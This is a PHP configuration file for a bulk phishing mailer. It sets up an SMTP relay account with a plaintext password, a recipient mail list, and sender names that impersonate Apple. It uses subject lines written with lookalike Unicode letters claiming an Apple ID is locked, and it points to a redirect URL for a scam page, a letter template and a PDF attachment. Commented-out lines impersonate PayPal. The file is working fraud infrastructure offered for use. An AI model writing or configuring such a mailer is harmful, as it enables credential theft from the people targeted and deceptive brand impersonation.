<?php
//include('Gx.function.php');
//Regards
date_default_timezone_set('America/New_York');
$date = date('F d, Y, h:i A T');

$randip       = "" . rand(1, 200) . "." . rand(1, 200) . "." . rand(1, 100) . "." . rand(1, 300) . "";
/*function nomer($randstr)
{
    $char = '0123456789';
    $str  = '';
    for ($i = 0;
        $i < $randstr;
        $i++) {
        $pos = rand(0, strlen($char) - 1);
        $str .= $char{$pos};
    }
    return $str;

};
function cok($randstr){
    $char = '1234567890';
    $str  = '';
    for ($i = 0;$i < $randstr;$i++) {
        $pos = rand(0, strlen($char) - 1);
        $str .= $char{$pos};
    }
    return $str;
} */

function cok($length){
  $chars = 'ABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789';
  return substr (str_shuffle ($chars),0,$length);
}
function nomer($length){
  $chars = '0123456789';
  return substr (str_shuffle ($chars),0,$length);
}
/* SMTP SETUP */
$smtp_acc = [
     [
        "host"     => "smtp-relay.gmail.com",
        "port"     => "587",
        "username" => "support-order.confirmation@buayaterbang9105.com",
        "password" => "kangian12"
    ], 

];

/* Features SETUP */

//print "mеmbeг".cok(1)."".nomer(2)."".RandString(1)."@ρауρаl.сοm";
$gx_setup = [
    "priority"       => 1,
    "userandom"      => 0,
    "sleeptime"      => 2,
    "replacement"    => 1,
    "filesend"       => 1,
    "userremoveline" => 0,
    "mail_list"      => "file/maillist/hot.txt",
    "fromname"       => "",
    "frommail"       => "unlocker-account.email-apple-##randstring##.##randstring##@##randstring##-##randstring##.##randstring##".RandString(20).".buayaterbang9105.com",
  //  "subject"        => "Re: Unuѕual sіgn-in actіvіty wіth yоur Αpρle ID ###randstring##".RandString(8)."",
    "subject"        => "Re: Your AppΙe ΙD has been tempοrariΙy Ιocked.  ###randstring##".RandString(10)." ",
    "msgfile"        => "file/letter/locked.html",
    "filepdf"        => "file/attachment/bf.pdf",
    "scampage"       => ["https://sumbernelayan.com/redirectx.php?id=".RandString(50).""],
    ];
//http://karykaty.com.br/a.php?##email##=".RandString(23)."
//crechemundodossonhos.com.br

$fname = array(
	'Apple',
	'Apple Support',
	'Apple Reminder',
	'Apple Notice',
	'support@Int.apple.com',
	'Support@Int.apple.com',
	'Apple Inc'
);
  //  'ΡауΡаl Rесονегу',
//    'Rесονегу ΡауΡаl',